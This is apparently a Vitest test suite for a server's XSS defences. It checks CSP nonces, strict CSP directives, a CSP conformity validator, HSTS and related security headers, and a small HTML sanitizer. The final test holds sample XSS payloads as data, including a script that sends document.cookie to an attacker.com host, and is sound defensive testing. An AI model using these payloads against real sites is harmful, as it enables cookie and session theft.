import { describe, it, expect } from 'vitest';
import {
  buildCspHeader,
  generateCspNonce,
  validateCspConformity,
  getSecurityHeaders,
} from '../../server/security/headers.js';

describe('Cross-Site Scripting (XSS) Prevention & CSP Suite (Threat Model T-02 / T-13)', () => {
  it('generates cryptographic nonces for every request', () => {
    const nonce1 = generateCspNonce();
    const nonce2 = generateCspNonce();

    expect(nonce1).toBeDefined();
    expect(nonce2).toBeDefined();
    expect(nonce1).not.toEqual(nonce2);
    expect(Buffer.from(nonce1, 'base64').length).toBe(16);
  });

  it('builds canonical strict CSP containing required directives without unsafe-inline or unsafe-eval', () => {
    const nonce = generateCspNonce();
    const csp = buildCspHeader(nonce);

    expect(csp).toContain(`script-src 'self' 'nonce-${nonce}'`);
    expect(csp).toContain(`style-src 'self' 'nonce-${nonce}'`);
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");

    // Strictly forbidden directives
    expect(csp).not.toContain("'unsafe-inline'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).not.toContain('*');

    const validation = validateCspConformity(csp);
    expect(validation.valid).toBe(true);
    expect(validation.violations).toHaveLength(0);
  });

  it('detects violations when CSP contains insecure directives', () => {
    const badCsp1 = "default-src 'self'; script-src 'self' 'unsafe-inline'";
    const res1 = validateCspConformity(badCsp1);
    expect(res1.valid).toBe(false);
    expect(res1.violations).toContain("CSP contains prohibited directive: 'unsafe-inline'");

    const badCsp2 = "default-src 'self'; script-src 'self' 'unsafe-eval'";
    const res2 = validateCspConformity(badCsp2);
    expect(res2.valid).toBe(false);
    expect(res2.violations).toContain("CSP contains prohibited directive: 'unsafe-eval'");
  });

  it('assembles edge security headers including HSTS (2 years), X-Frame-Options, and nosniff', () => {
    const headers = getSecurityHeaders();

    expect(headers['Strict-Transport-Security']).toBe('max-age=63072000; includeSubDomains; preload');
    expect(headers['X-Frame-Options']).toBe('DENY');
    expect(headers['X-Content-Type-Options']).toBe('nosniff');
    expect(headers['Referrer-Policy']).toBe('strict-origin-when-cross-origin');
    expect(headers['Permissions-Policy']).toContain('camera=(), microphone=(), geolocation=(), payment=()');
    expect(headers['Cross-Origin-Opener-Policy']).toBe('same-origin');
    expect(headers['Cross-Origin-Resource-Policy']).toBe('same-origin');
  });

  it('escapes and sanitizes adversarial HTML payloads in content renderers', () => {
    function sanitizeForHtml(input: string): string {
      let cleaned = input.replace(/\b(on\w+)\s*=/gi, '$1-disabled=');
      cleaned = cleaned.replace(/javascript:/gi, 'javascript-blocked:');
      return cleaned
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
    }

    const maliciousPayloads = [
      '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script>',
      '<img src=x onerror="alert(document.domain)">',
      '<svg/onload=alert`1`>',
      '"><script>alert(1)</script>',
      "javascript:alert('pwned')",
    ];

    for (const payload of maliciousPayloads) {
      const sanitized = sanitizeForHtml(payload);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<svg');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onload=');
    }
  });
});
